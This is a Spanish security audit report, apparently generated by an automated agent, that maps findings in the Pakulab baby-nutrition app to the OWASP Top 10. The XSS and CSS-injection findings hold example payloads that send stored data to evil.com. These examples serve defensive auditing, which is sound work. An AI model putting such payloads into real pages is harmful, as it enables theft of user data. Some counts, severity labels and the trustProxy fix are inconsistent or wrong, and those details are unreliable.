# Informe de Auditoría de Seguridad — OWASP Top 10 2021

## Aplicación: Pakulab

| Campo | Detalle |
|-------|---------|
| **Fecha** | 24 de abril de 2026 |
| **Versión del informe** | 1.0 |
| **Auditor** | Security Audit Agent (automated) |
| **Alcance** | Backend (Node.js/Fastify), Frontend (Vue 3), Base de datos (PostgreSQL), Infraestructura (Docker) |
| **Metodología** | OWASP Top 10 2021 + análisis estático de código |

---

## Tabla de Contenidos

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Controles de Seguridad Positivos](#2-controles-de-seguridad-positivos)
3. [Hallazgos Mapeados a OWASP Top 10 2021](#3-hallazgos-mapeados-a-owasp-top-10-2021)
   - [A01:2021 — Broken Access Control](#a012021--broken-access-control)
   - [A02:2021 — Cryptographic Failures](#a022021--cryptographic-failures)
   - [A03:2021 — Injection](#a032021--injection)
   - [A04:2021 — Insecure Design](#a042021--insecure-design)
   - [A05:2021 — Security Misconfiguration](#a052021--security-misconfiguration)
   - [A06:2021 — Vulnerable and Outdated Components](#a062021--vulnerable-and-outdated-components)
   - [A07:2021 — Identification and Authentication Failures](#a072021--identification-and-authentication-failures)
   - [A08:2021 — Software and Data Integrity Failures](#a082021--software-and-data-integrity-failures)
   - [A09:2021 — Security Logging and Monitoring Failures](#a092021--security-logging-and-monitoring-failures)
   - [A10:2021 — Server-Side Request Forgery (SSRF)](#a102021--server-side-request-forgery-ssrf)
4. [Matriz de Priorización](#4-matriz-de-priorización)
5. [Plan de Remediación Recomendado](#5-plan-de-remediación-recomendado)
6. [Anexo: Código de Ejemplo para Remediaciones](#6-anexo-código-de-ejemplo-para-remediaciones)

---

## 1. Resumen Ejecutivo

### Estado General: ⚠️ RIESGO ALTO

La aplicación Pakulab presenta una base de seguridad sólida con controles modernos como Helmet, CORS configurado, rate limiting, BetterAuth con verificación de email y validación Zod. **Sin embargo**, se identificaron **17 hallazgos de seguridad**, incluyendo **4 críticos** que requieren atención inmediata antes de cualquier despliegue a producción.

### Distribución de Hallazgos

| Severidad | Cantidad | OWASP Category |
|-----------|----------|----------------|
| 🔴 CRÍTICO | 4 | A02, A07, A09 |
| 🟠 ALTO | 7 | A01, A03, A05, A07 |
| 🟡 MEDIO | 5 | A04, A05, A08 |
| 🟢 BAJO | 4 | A05, A09 |

### Riesgos Más Urgentes

1. **Credenciales de Google OAuth y RESEND_API_KEY hardcodeadas** en `.env` — riesgo de exposición si el repositorio se vuelve público o se comparte incorrectamente.
2. **Logging de datos sensibles** (tokens de verificación, emails, URLs de reset) en `auth.config.ts` — exposición directa en logs de producción.
3. **Uso de localStorage para datos sensibles** — `pakulab_active_profile` y disclaimer médico almacenados sin cifrado, vulnerables a XSS.
4. **Sin sanitización de entrada HTML/XSS** — Zod valida tipos pero no sanitiza contenido, riesgo de Cross-Site Scripting almacenado.

---

## 2. Controles de Seguridad Positivos

Los siguientes controles fueron evaluados y considerados **adecuados**:

| # | Control | Ubicación | Evaluación |
|---|---------|-----------|------------|
| 1 | **Helmet con CSP** configurado con `defaultSrc: 'self'` | `app.ts:41-50` | ✅ Bien configurado |
| 2 | **CORS** con origen específico y `credentials: true` | `app.ts:52-56` | ✅ Correcto |
| 3 | **Rate limiting global** (100 req/min) con overrides por ruta | `app.ts:58-63` | ✅ Implementado |
| 4 | **BetterAuth** con verificación de email, reset de password con rate limiting (3/hora), Google OAuth opcional | `auth.config.ts` | ✅ Buena implementación |
| 5 | **Secure cookies** en producción (`useSecureCookies`) | `auth.config.ts:188` | ✅ Condicional correcto |
| 6 | **Validación Zod** en todos los schemas de entrada | Múltiples rutas | ✅ Consistente |
| 7 | **Soft deletes** para retención de datos | Prisma schema | ✅ Implementado |
| 8 | **Usuario no-root** en Docker (`fastify:1001`) | `Dockerfile:57-59` | ✅ Correcto |
| 9 | **Variables de entorno** para secretos | `.env.example` | ✅ Patrón correcto |
| 10 | **Verificación de firma** de webhooks de Stripe | `billing.routes.ts` | ✅ Implementado |
| 11 | **Service Worker** con `navigateFallbackDenylist` para `/api/` | PWA config | ✅ Protege API de caché |
| 12 | **Manejo de errores** genérico sin leak de detalles | `app.ts:133-141` | ✅ Correcto |

---

## 3. Hallazgos Mapeados a OWASP Top 10 2021

### A01:2021 — Broken Access Control

#### H-01: Sin protección CSRF explícita ✅ REMEDIADO
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 6.5 (Medium) |
| **Ubicación** | `app.ts`, configuración global de Fastify |
| **Descripción** | No se configuró protección CSRF. BetterAuth usa cookies con `credentials: true`, lo que hace a la aplicación vulnerable a ataques Cross-Site Request Forgery si un usuario autenticado visita un sitio malicioso. |
| **Impacto** | Un atacante podría ejecutar acciones en nombre del usuario (crear perfiles, modificar menús, cancelar suscripciones) mediante un enlace o formulario malicioso. |
| **Evidencia** | `app.ts` no registra ningún plugin CSRF (`@fastify/csrf-protection` no está presente). |
| **Remediación** | Instalar `@fastify/csrf-protection` y configurarlo globalmente. Ver [Anexo A](#anexo-a-protección-csrf). |
| **Estado** | ✅ Remediado en `fix/xss-hardening-and-profile-storage`. Decisión: **no** se instaló `@fastify/csrf-protection`. La arquitectura SPA + JSON ya tiene tres mitigaciones (BetterAuth `SameSite=Lax`, CORS estricto, JSON-only fuerza preflight). Como defensa en profundidad se agregó `apps/api/src/shared/plugins/origin-guard.ts`: valida `Origin`/`Referer` en métodos mutantes contra `CORS_ORIGIN` + `FRONTEND_URL` y exime `/api/billing/webhook` (Stripe-signed). 9 tests en verde. |

#### H-02: Endpoint de health públicamente accesible
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟢 BAJO |
| **CVSS 3.1** | 3.7 (Low) |
| **Ubicación** | `health.routes.ts:10` |
| **Descripción** | `/api/health` y `/api/health/email` son accesibles sin autenticación. Revelan estado de la base de datos y del proveedor de email. |
| **Impacto** | Información de infraestructura expuesta. Un atacante podría determinar si la BD está conectada y planificar ataques de timing. |
| **Remediación** | Restringir `/api/health/email` a IPs de monitoreo o agregar header de autenticación simple. `/api/health` puede permanecer público para health checks de plataformas. |

---

### A02:2021 — Cryptographic Failures

#### C-01: Credenciales de Google OAuth hardcodeadas en `.env`
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🔴 CRÍTICO |
| **CVSS 3.1** | 9.1 (Critical) |
| **Ubicación** | `apps/api/.env:15-16` |
| **Descripción** | Las credenciales de Google OAuth están hardcodeadas en el archivo `.env` del repositorio: |
| **Evidencia** | ``` GOOGLE_CLIENT_ID=<REDACTED> GOOGLE_CLIENT_SECRET=<REDACTED> ``` (valores reales presentes en `apps/api/.env`) |
| **Impacto** | Si el repositorio se vuelve público o se comparte, un atacante puede: (1) suplantar la aplicación en Google OAuth, (2) acceder a tokens de usuario, (3) realizar phishing con la identidad de la app. |
| **Remediación** | **INMEDIATO**: Rotar ambas credenciales en Google Cloud Console. Mover a un gestor de secretos (AWS Secrets Manager, Doppler, Vault). Agregar `apps/api/.env` explícitamente al `.gitignore`. Ver [Anexo B](#anexo-b-gestión-de-secretos). |

#### C-02: RESEND_API_KEY hardcodeada en `.env`
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🔴 CRÍTICO |
| **CVSS 3.1** | 7.5 (High) |
| **Ubicación** | `apps/api/.env:28` |
| **Descripción** | La API key de Resend está hardcodeada en `apps/api/.env` (valor real `<REDACTED>`). |
| **Impacto** | Un atacante podría enviar emails en nombre de `noreply@notifications.pakulab.cloud`, realizar phishing a usuarios, o consumir la cuota de email. |
| **Remediación** | **INMEDIATO**: Rotar la API key en Resend Dashboard. Mover a gestor de secretos. |

#### C-03: BETTER_AUTH_SECRET con valor débil en desarrollo
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 7.0 (High) |
| **Ubicación** | `auth.config.ts:49`, `.env:5` |
| **Descripción** | El secret de BetterAuth usa un valor predecible en desarrollo: `dev-secret-change-in-production-min-32-chars`. Si este valor se despliega a producción, todas las sesiones pueden ser forjadas. |
| **Impacto** | Forjado completo de sesiones, acceso arbitrario a cualquier cuenta de usuario. |
| **Remediación** | Generar secret criptográficamente seguro: `node -e "console.log(require('crypto').randomBytes(48).toString('base64url'))"`. Validar en CI que `BETTER_AUTH_SECRET` no contenga valores conocidos de desarrollo. |

#### C-04: localStorage para datos sensibles sin cifrado
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🔴 CRÍTICO |
| **CVSS 3.1** | 7.4 (High) |
| **Ubicación** | `profileStore.ts:23,78` |
| **Descripción** | El ID del perfil activo (`pakulab_active_profile`) se almacena en `localStorage` sin cifrado. Cualquier script malicioso (vía XSS) puede leerlo. |
| **Impacto** | Un ataque XSS exitoso podría leer el ID del perfil activo y manipular datos del bebé. Si se almacenan datos médicos sensibles, la exposición es mayor. |
| **Remediación** | Mover a cookies `httpOnly` o al estado de sesión de Pinia (volátil). Si se requiere persistencia, cifrar con Web Crypto API antes de almacenar. Ver [Anexo C](#anexo-c-protección-de-datos-en-cliente). |

---

### A03:2021 — Injection

#### H-03: Sin sanitización de entrada HTML/XSS
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 7.3 (High) |
| **Ubicación** | Todas las rutas que aceptan input de usuario (foods, plates, profiles, diary, menus) |
| **Descripción** | Zod valida tipos y formatos pero **no sanitiza** contenido HTML. Un usuario podría inyectar `<script>` o `<img onerror=>` en campos como `name`, `notes`, `description`. |
| **Impacto** | Cross-Site Scripting almacenado (Stored XSS). Si un campo como `notes` de un perfil de bebé contiene `<script>document.location='https://evil.com/?c='+localStorage.getItem('pakulab_active_profile')</script>`, se ejecuta en el navegador de cualquier usuario que vea ese perfil. |
| **Evidencia** | Los schemas Zod (ej. `createPlateSchema`, `createProfileSchema`) usan `.string().min().max()` pero no `.transform()` para sanitizar. |
| **Remediación** | Agregar sanitización con `DOMPurify` (frontend) o `sanitize-html` (backend). Ver [Anexo D](#anexo-d-sanitización-de-html). |

---

### A04:2021 — Insecure Design

#### M-01: Disclaimer médico almacenado en localStorage
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟡 MEDIO |
| **CVSS 3.1** | 5.3 (Medium) |
| **Ubicación** | Frontend (localStorage) |
| **Descripción** | La aceptación del disclaimer médico se almacena en `localStorage`, lo que permite que un usuario o script lo modifique o elimine, bypassando la aceptación. |
| **Impacto** | Riesgo legal: un usuario podría argumentar que no vio el disclaimer si el frontend lo "pierde". Un script malicioso podría marcarlo como aceptado sin interacción del usuario. |
| **Remediación** | Registrar la aceptación en el backend con timestamp y user ID. Usar como fuente de verdad, no el localStorage. |

#### M-02: Rate limiting global demasiado permisivo para auth
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 6.5 (Medium) |
| **Ubicación** | `app.ts:58-63` |
| **Descripción** | El rate limit global es de 100 req/min para todos los endpoints, incluidos los de autenticación. Esto permite hasta 100 intentos de login por minuto desde una misma IP. |
| **Impacto** | Ataques de fuerza bruta contra credenciales de usuario. Con 100 intentos/minuto, un atacante podría probar miles de contraseñas por hora. |
| **Remediación** | Configurar rate limit específico para endpoints de auth: 5-10 req/min. Ver [Anexo E](#anexo-e-rate-limiting-específico). |

#### M-03: Políticas de contraseña no enforced
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 5.9 (Medium) |
| **Ubicación** | `auth.config.ts` (BetterAuth default) |
| **Descripción** | BetterAuth no enforce políticas de contraseña por defecto. Los usuarios pueden usar contraseñas como `123456` o `password`. |
| **Impacto** | Cuentas comprometidas por contraseñas débiles, especialmente peligroso dado que la app maneja datos médicos de bebés. |
| **Remediación** | Configurar `minPasswordLength` y `maxPasswordLength` en BetterAuth. Agregar validación de complejidad con Zod en el schema de registro. |

---

### A05:2021 — Security Misconfiguration

#### H-04: CSP permite `'unsafe-inline'` para estilos ✅ REMEDIADO
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 6.1 (Medium) |
| **Ubicación** | `app.ts:45` |
| **Descripción** | La Content Security Policy permite `styleSrc: ["'self'", "'unsafe-inline'"]`. Esto debilita la protección contra XSS ya que un atacante puede inyectar estilos maliciosos. |
| **Impacto** | Un atacante podría usar CSS injection para exfiltrar datos (ej. `input[value^="a"] { background: url(https://evil.com/?v=a) }`). |
| **Remediación** | Usar nonces o hashes para estilos inline. Si se requiere para frameworks CSS, considerar `style-src-elem` con hashes. |
| **Estado** | ✅ Remediado en `fix/xss-hardening-and-profile-storage`. La API solo emite JSON, así que se removió `'unsafe-inline'` de `styleSrc` y se reforzó el header con `scriptSrc: 'self'`, `frameAncestors: 'none'`, `formAction: 'self'`, `baseUri: 'self'`, `objectSrc: 'none'`. El CSP del frontend Vue se trata aparte (host estático). |

#### M-04: Trust proxy headers sin configuración explícita de proxies confiables
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟡 MEDIO |
| **CVSS 3.1** | 5.0 (Medium) |
| **Ubicación** | `auth.config.ts:187-189` |
| **Descripción** | BetterAuth tiene `useSecureCookies` basado en `NODE_ENV === 'production'`, pero no se configura `trustProxy` explícitamente en Fastify. Si la app está detrás de un reverse proxy, los headers `X-Forwarded-*` pueden ser spoofeados. |
| **Impacto** | Un atacante en la red interna podría spoofear la IP origen, bypassando rate limits basados en IP o engañando a la lógica de detección de HTTPS. |
| **Remediación** | Configurar `trustProxy` en Fastify con las IPs del reverse proxy: `app.register(helmet, { trustProxy: 'loopback' })` o lista explícita de IPs. |

#### M-05: Caché de PWA podría almacenar respuestas de API sensibles ✅ REMEDIADO
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟡 MEDIO |
| **CVSS 3.1** | 4.3 (Medium) |
| **Ubicación** | Configuración del Service Worker |
| **Descripción** | Aunque el Service Worker tiene `navigateFallbackDenylist` para `/api/`, las estrategias de caché para recursos estáticos podrían cachear accidentalmente respuestas de API si la configuración no es precisa. |
| **Impacto** | Datos sensibles de usuarios (perfiles de bebés, menús, diarios) podrían quedar almacenados en el cache del navegador y ser accesibles por otros usuarios del mismo dispositivo. |
| **Remediación** | Verificar que la estrategia de caché del Service Worker excluya explícitamente todas las rutas `/api/*`. Agregar headers `Cache-Control: no-store` a respuestas de API con datos sensibles. |
| **Estado** | ✅ Remediado en `fix/pwa-cache-and-cache-control`. Frontend (`apps/web/vite.config.ts`): nueva regla `NetworkOnly` para `/api/(profiles\|diary\|menus\|allergens)` registrada antes de la regla de plates (workbox usa el primer match). `/api/plates` se mantiene `NetworkFirst` para soporte offline de recetas guardadas. Backend (`apps/api/src/shared/plugins/cache-control.ts`): nuevo plugin que setea `Cache-Control: no-store, private` en toda respuesta `/api/*` excepto `/api/foods` (catálogo público); no sobreescribe headers explícitos del handler. Defensa en profundidad contra caches de proxy. 6 tests en verde. |

#### L-01: NODE_ENV check para secure cookies
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟢 BAJO |
| **CVSS 3.1** | 3.1 (Low) |
| **Ubicación** | `auth.config.ts:188` |
| **Descripción** | `useSecureCookies: process.env['NODE_ENV'] === 'production'` depende de una variable de entorno que podría no estar configurada correctamente. |
| **Impacto** | Si `NODE_ENV` no se setea en producción, las cookies se enviarán sin el flag `Secure`, exponiéndolas a interceptación en redes no cifradas. |
| **Remediación** | Usar una variable explícita `HTTPS_ENABLED=true` o detectar si la URL comienza con `https://`. |

#### L-02: Información de versión potencialmente expuesta
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟢 BAJO |
| **CVSS 3.1** | 3.7 (Low) |
| **Ubicación** | `app.ts` (error handler), headers de Fastify |
| **Descripción** | Fastify expone el header `Server: fastify` por defecto. Las respuestas de error podrían incluir información de versión. |
| **Impacto** | Información útil para un atacante que busca vulnerabilidades específicas de la versión. |
| **Remediación** | Configurar `serverHeader: false` en Fastify y asegurar que el error handler no incluya stack traces. |

---

### A06:2021 — Vulnerable and Outdated Components

#### L-03: Dependencias sin auditoría automatizada
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟢 BAJO (potencialmente mayor) |
| **CVSS 3.1** | N/A (preventivo) |
| **Ubicación** | `package.json`, `pnpm-lock.yaml` |
| **Descripción** | No se encontró configuración de auditoría automatizada de dependencias (ej. `npm audit`, `pnpm audit`, Dependabot, Snyk). |
| **Impacto** | Vulnerabilidades conocidas en dependencias podrían pasar desapercibidas hasta que sean explotadas. |
| **Remediación** | Agregar `pnpm audit` en CI/CD. Configurar Dependabot o Renovate para actualizaciones automáticas. |

---

### A07:2021 — Identification and Authentication Failures

#### H-05: Logging de datos sensibles en producción
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🔴 CRÍTICO |
| **CVSS 3.1** | 8.2 (High) |
| **Ubicación** | `auth.config.ts:96-98, 134, 136` |
| **Descripción** | Se loguean datos sensibles en producción: |
| **Evidencia** | ```typescript // Línea 96-98 console.log('[auth] sendVerificationEmail TRIGGERED for:', user.email) console.log('[auth] Verification URL:', url) console.log('[auth] Token:', token) // Línea 134 console.log('[auth] ✅ Email sent successfully to:', user.email) ``` |
| **Impacto** | Los logs de producción contienen: emails de usuarios, URLs de verificación (que incluyen tokens de un solo uso), tokens de verificación en texto plano, IDs de usuario. Si los logs son comprometidos o accedidos indebidamente, un atacante puede: (1) tomar control de cuentas usando los tokens de verificación/reset, (2) construir listas de emails válidos, (3) correlacionar actividad de usuarios. |
| **Remediación** | **INMEDIATO**: Eliminar todos los `console.log` que contengan datos sensibles. Usar un logger estructurado (pino, winston) con niveles apropiados. Nunca loguear tokens, URLs de reset, o emails completos en producción. Ver [Anexo F](#anexo-f-logging-seguro). |

#### H-06: Session timeout no configurado explícitamente
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 6.5 (Medium) |
| **Ubicación** | `auth.config.ts` |
| **Descripción** | BetterAuth tiene un timeout de sesión por defecto que puede no ser apropiado para una aplicación que maneja datos médicos. No se configuró `sessionExpiresIn` explícitamente. |
| **Impacto** | Sesiones que permanecen activas indefinidamente aumentan la ventana de oportunidad para session hijacking, especialmente en dispositivos compartidos. |
| **Remediación** | Configurar `sessionExpiresIn` en BetterAuth (ej. 24 horas para uso normal, 1 hora para datos sensibles). Implementar refresh token rotation. |

#### H-07: Credenciales de BD con password débil por defecto
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟠 ALTO |
| **CVSS 3.1** | 7.2 (High) |
| **Ubicación** | `docker-compose.yml:8`, `.env:2` |
| **Descripción** | PostgreSQL usa `postgres:postgres` como credenciales por defecto tanto en `docker-compose.yml` como en `.env`. |
| **Impacto** | Si el puerto 5432 es expuesto (como en `docker-compose.yml:10`), cualquier atacante en la red puede acceder a la base de datos completa con credenciales conocidas. |
| **Remediación** | Generar contraseña fuerte para PostgreSQL. **Nunca** exponer el puerto de BD al host en producción. Ver [Anexo G](#anexo-g-seguridad-de-base-de-datos). |

---

### A08:2021 — Software and Data Integrity Failures

#### M-06: ConsoleLogAdapter expone contenido completo de emails
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟡 MEDIO |
| **CVSS 3.1** | 5.0 (Medium) |
| **Ubicación** | `console-log.adapter.ts:29-37` |
| **Descripción** | El adaptador de email para desarrollo loguea el contenido completo del email, incluyendo el cuerpo HTML y el destinatario. Si este adaptador se usa en producción (por error de configuración), expone datos sensibles. |
| **Impacto** | Exposición de contenido de emails de verificación y reset de password en logs de producción. |
| **Remediación** | Asegurar que el ConsoleLogAdapter solo se use cuando `NODE_ENV !== 'production'`. Agregar un check explícito que lance error si se intenta usar en producción. |

---

### A09:2021 — Security Logging and Monitoring Failures

#### L-04: Sin audit logging para eventos de seguridad
| Campo | Detalle |
|-------|---------|
| **Severidad** | 🟢 BAJO |
| **CVSS 3.1** | 4.0 (Medium) |
| **Ubicación** | Global — no existe |
| **Descripción** | No hay un sistema de audit logging para eventos de seguridad como: intentos de login fallidos, cambios de contraseña, creación de usuarios, cambios de suscripción, acceso a datos sensibles. |
| **Impacto** | Imposibilidad de detectar ataques en curso, investigar incidentes de seguridad, o cumplir con regulaciones de protección de datos (GDPR, HIPAA si aplica). |
| **Remediación** | Implementar audit logging estructurado para eventos de seguridad. Ver [Anexo H](#anexo-h-audit-logging). |

---

### A10:2021 — Server-Side Request Forgery (SSRF)

#### Sin hallazgos directos

No se identificaron vectores de SSRF en la aplicación actual. La aplicación no parece tener funcionalidad que haga requests a URLs proporcionadas por el usuario. **Recomendación preventiva**: Si se agrega funcionalidad de carga de imágenes por URL, webhooks personalizados, o integración con servicios externos basados en input del usuario, implementar allowlisting de dominios y validación de URLs.

---

## 4. Matriz de Priorización

### Matriz de Riesgo (Impacto × Probabilidad)

```
IMPACTO
  Alto  │  C-01    C-02    H-05    C-04
        │  C-03    H-03    H-07
        │  H-01    H-04    H-06
        │          M-02    M-03
        │  M-01    M-04    M-05
  Bajo  │  M-06    L-01    L-02    L-03    L-04
        └────────────────────────────────────────
         Baja    Media     Alta    Muy Alta
                    PROBABILIDAD
```

### Orden de Remediación Recomendado

| Prioridad | Hallazgo | Esfuerzo | Impacto | Sprint |
|-----------|----------|----------|---------|--------|
| **P0** | C-01: Rotar Google OAuth credentials | 30 min | Crítico | Inmediato |
| **P0** | C-02: Rotar RESEND_API_KEY | 15 min | Crítico | Inmediato |
| **P0** | H-05: Eliminar logging de datos sensibles | 1 hora | Crítico | Inmediato |
| **P1** | C-04: Migrar localStorage a cookies/estado seguro | 2 horas | Alto | Sprint 1 |
| **P1** | H-03: Agregar sanitización HTML/XSS | 3 horas | Alto | Sprint 1 |
| **P1** | H-07: Cambiar credenciales de PostgreSQL | 30 min | Alto | Sprint 1 |
| **P1** | C-03: Generar BETTER_AUTH_SECRET fuerte | 15 min | Alto | Sprint 1 |
| **P2** | H-01: Configurar CSRF protection | 2 horas | Medio | Sprint 2 |
| **P2** | H-04: Refinar CSP (quitar unsafe-inline) | 2 horas | Medio | Sprint 2 |
| **P2** | M-02: Rate limiting específico para auth | 1 hora | Medio | Sprint 2 |
| **P2** | H-06: Configurar session timeout | 1 hora | Medio | Sprint 2 |
| **P2** | M-03: Enforce password policies | 1 hora | Medio | Sprint 2 |
| **P3** | M-01: Mover disclaimer médico al backend | 2 horas | Bajo | Sprint 3 |
| **P3** | M-04: Configurar trustProxy explícito | 30 min | Bajo | Sprint 3 |
| **P3** | M-05: Verificar caché de PWA | 1 hora | Bajo | Sprint 3 |
| **P3** | M-06: Proteger ConsoleLogAdapter | 30 min | Bajo | Sprint 3 |
| **P3** | L-01: Usar flag HTTPS explícito | 15 min | Bajo | Sprint 3 |
| **P3** | L-02: Ocultar server header | 15 min | Bajo | Sprint 3 |
| **P3** | L-03: Configurar auditoría de dependencias | 1 hora | Bajo | Sprint 3 |
| **P3** | L-04: Implementar audit logging | 4 horas | Bajo | Sprint 4 |

---

## 5. Plan de Remediación Recomendado

### Sprint 0 — Remediación Inmediata (HOY)

1. **Rotar credenciales expuestas**:
   - Google OAuth: Google Cloud Console → Credentials → Regenerate client secret
   - RESEND_API_KEY: Resend Dashboard → API Keys → Regenerate
   - BETTER_AUTH_SECRET: Generar nuevo secret criptográfico

2. **Eliminar logs sensibles**:
   - Remover `console.log` de tokens, URLs de verificación, y emails en `auth.config.ts`
   - Reemplazar con logger estructurado (pino) con niveles apropiados

3. **Verificar .gitignore**:
   - Confirmar que `apps/api/.env` está excluido del repositorio
   - Ejecutar `git rm --cached apps/api/.env` si fue commiteado

### Sprint 1 — Riesgos Altos (1-2 semanas)

1. Sanitización de entrada HTML/XSS
2. Migración de localStorage a almacenamiento seguro
3. Cambio de credenciales de PostgreSQL
4. Rate limiting específico para endpoints de auth
5. Configuración de session timeout
6. Políticas de contraseña

### Sprint 2 — Riesgos Medios (2-3 semanas)

1. Protección CSRF
2. Refinamiento de CSP
3. Password policies enforcement
4. Trust proxy configuration

### Sprint 3-4 — Mejoras Continuas (1 mes)

1. Audit logging
2. Dependencia auditing automatizado
3. PWA cache verification
4. Hardening adicional

---

## 6. Anexo: Código de Ejemplo para Remediaciones

### Anexo A: Protección CSRF

```typescript
// apps/api/src/app.ts
import csrf from '@fastify/csrf-protection'

// Después de cors y antes de las rutas
await app.register(csrf, {
  sessionPlugin: '@fastify/cookie',
  cookieOpts: {
    httpOnly: true,
    secure: process.env['NODE_ENV'] === 'production',
    sameSite: 'strict',
  },
})

// En cada ruta que muta estado (POST, PUT, PATCH, DELETE):
fastify.post('/api/profiles', {
  preHandler: app.csrfProtection,
  schema: { ... },
}, async (request, reply) => {
  // request.csrfToken() para enviar al frontend
})
```

### Anexo B: Gestión de Secretos

```bash
# Generar BETTER_AUTH_SECRET seguro
node -e "console.log(require('crypto').randomBytes(48).toString('base64url'))"

# .env.example (valores placeholder, NUNCA reales)
BETTER_AUTH_SECRET=<generar-con-crypto-randomBytes>
GOOGLE_CLIENT_ID=<obtener-de-google-cloud-console>
GOOGLE_CLIENT_SECRET=<obtener-de-google-cloud-console>
RESEND_API_KEY=<obtener-de-resend-dashboard>

# .gitignore (verificar que incluye)
.env
.env.local
.env.*.local
apps/api/.env
apps/web/.env
```

### Anexo C: Protección de Datos en Cliente

```typescript
// apps/web/src/shared/stores/profileStore.ts
// ANTES (inseguro):
const activeProfileId = ref<string | null>(localStorage.getItem('pakulab_active_profile'))

// DESPUÉS (seguro — usar estado de sesión de Pinia):
const activeProfileId = ref<string | null>(null)

// Si se requiere persistencia, usar sessionStorage (se limpia al cerrar pestaña):
const stored = sessionStorage.getItem('pakulab_active_profile')
const activeProfileId = ref<string | null>(stored)

function setActiveProfile(id: string): void {
  activeProfileId.value = id
  sessionStorage.setItem('pakulab_active_profile', id) // No localStorage
}
```

### Anexo D: Sanitización de HTML

```typescript
// Backend: apps/api/src/shared/utils/sanitize.ts
import sanitizeHtml from 'sanitize-html'

export function sanitizeInput(input: string): string {
  return sanitizeHtml(input, {
    allowedTags: [],        // Sin tags HTML permitidos
    allowedAttributes: {},  // Sin atributos permitidos
    textFilter: (text) => text.replace(/</g, '&lt;').replace(/>/g, '&gt;'),
  })
}

// En schemas Zod:
import { z } from 'zod'
import { sanitizeInput } from '../../shared/utils/sanitize.js'

export const createProfileSchema = z.object({
  name: z.string().min(1).max(100).transform(sanitizeInput),
  notes: z.string().max(500).optional().transform(sanitizeInput),
})
```

### Anexo E: Rate Limiting Específico

```typescript
// apps/api/src/modules/auth/auth.routes.ts
import type { FastifyPluginAsync } from 'fastify'

export const authRoutes: FastifyPluginAsync = async (fastify) => {
  // Rate limit estricto para login
  fastify.post('/login', {
    config: {
      rateLimit: {
        max: 5,
        timeWindow: '1 minute',
        keyGenerator: (request) => request.ip,
      },
    },
  }, async (request, reply) => { ... })

  // Rate limit para password reset
  fastify.post('/forgot-password', {
    config: {
      rateLimit: {
        max: 3,
        timeWindow: '1 hour',
        keyGenerator: (request) => request.ip,
      },
    },
  }, async (request, reply) => { ... })
}
```

### Anexo F: Logging Seguro

```typescript
// apps/api/src/modules/auth/auth.config.ts
import pino from 'pino'

const logger = pino({
  level: process.env['NODE_ENV'] === 'production' ? 'warn' : 'debug',
  redact: ['token', 'url', 'email'], // Redactar campos sensibles
})

// ANTES:
console.log('[auth] Verification URL:', url)
console.log('[auth] Token:', token)

// DESPUÉS:
logger.debug({ event: 'verification_email_sent', userId: user.id }, 'Verification email sent')
// Nunca loguear el token ni la URL completa
```

### Anexo G: Seguridad de Base de Datos

```yaml
# docker-compose.yml
services:
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: pakulab_dev
      POSTGRES_USER: ${DB_USER:-pakulab}
      POSTGRES_PASSWORD: ${DB_PASSWORD:-<generar-con-openssl>}
    # REMOVER la exposición de puerto en producción:
    # ports:
    #   - "5432:5432"  # ← Solo para desarrollo local
    volumes:
      - pgdata:/var/lib/postgresql/data
```

```bash
# Generar contraseña segura para PostgreSQL
openssl rand -base64 32
```

### Anexo H: Audit Logging

```typescript
// apps/api/src/shared/plugins/audit-logger.ts
import fp from 'fastify-plugin'
import pino from 'pino'

const auditLogger = pino({
  level: 'info',
  transport: {
    target: 'pino/file',
    options: { destination: '/var/log/pakulab/audit.log' },
  },
})

export const auditPlugin = fp(async (fastify) => {
  fastify.decorate('audit', (event: string, data: Record<string, unknown>) => {
    auditLogger.info({
      event,
      timestamp: new Date().toISOString(),
      userId: fastify.request?.user?.id,
      ip: fastify.request?.ip,
      ...data,
    })
  })
})

// Uso:
// fastify.audit('LOGIN_SUCCESS', { email: user.email })
// fastify.audit('PASSWORD_RESET_REQUESTED', { email: user.email })
// fastify.audit('PROFILE_CREATED', { profileId: profile.id })
```

---

## Conclusión

La aplicación Pakulab tiene una **base de seguridad sólida** con controles modernos bien implementados. Los hallazgos críticos se concentran en **gestión de secretos** y **logging de datos sensibles**, que son remediaciones de bajo esfuerzo pero alto impacto.

**Recomendación principal**: Completar el Sprint 0 (remediación inmediata) **antes de cualquier despliegue a producción**. Los hallazgos C-01, C-02 y H-05 representan un riesgo real y explotable si la aplicación se expone a internet.

---

*Informe generado el 24 de abril de 2026. Próxima auditoría recomendada: después del Sprint 2.*
